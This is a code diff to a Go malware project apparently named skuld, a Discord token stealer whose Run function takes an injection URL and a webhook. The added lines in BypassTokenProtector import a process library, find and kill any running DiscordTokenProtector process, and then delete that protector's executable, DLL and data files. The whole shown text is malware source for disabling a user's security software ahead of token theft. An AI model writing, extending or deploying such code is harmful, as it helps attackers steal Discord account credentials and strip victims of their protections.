@@ -8,12 +8,14 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"strings"
 
 	"golang.org/x/text/encoding/charmap"
 
 	"encoding/json"
 
 	"github.com/hackirby/skuld/utils/hardware"
+	"github.com/shirou/gopsutil/v3/process"
 )
 
 func Run(injection_url string, webhook string) {
@@ -111,6 +113,15 @@ func BypassBetterDiscord(user string) error {
 func BypassTokenProtector(user string) error {
 	path := filepath.Join(user, "AppData", "Roaming", "DiscordTokenProtector")
 	config := path + "\\config.json"
+
+	processes, _ := process.Processes()
+
+	for _, p := range processes {
+		name, _ := p.Name()
+		if strings.Contains(strings.ToLower(name), "discordtokenprotector") {
+			p.Kill()
+		}
+	}
 
 	for _, i := range []string{"DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"} {
 		_ = os.Remove(path + "\\" + i)
